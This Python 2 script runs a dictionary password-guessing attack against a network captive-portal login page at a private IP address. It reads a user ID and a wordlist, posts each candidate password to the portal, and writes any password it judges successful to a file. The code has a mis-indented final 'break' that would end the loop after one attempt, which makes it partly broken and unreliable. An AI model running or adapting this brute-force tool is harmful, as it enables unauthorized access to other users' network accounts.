#!/bin/python


import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML


userid = raw_input("enter user id:")
 
filenm = raw_input("Enter the wordlist filename: ")

#Loads the file and mentions no.of entries:
def load_words(file):
    print "loading words from file..."
    wordlist = list()
    with open(file) as f:
        for line in f:
            wordlist.append(line.rstrip('\n'))
    print " ", len(wordlist), "words loaded."
    return wordlist

passwd = load_words(filenm)


def sendLoginRequest(username, password):
    url = 'http://172.29.0.1:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + username + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        elif 'Limit' in response:
            return True
        elif 'Maximum' in response:
            return True
        elif 'data' in response:
            return True
            
    except:
        return False
    
for l in passwd:
    print l+" "+userid
    if sendLoginRequest(userid, l) == True:        
        print 'success!!! and '+l+' - password, userid -'+userid
        with open("user.txt","a") as myfile:
            myfile.write(userid+" "+str(l)+'\n')
            break
   	break
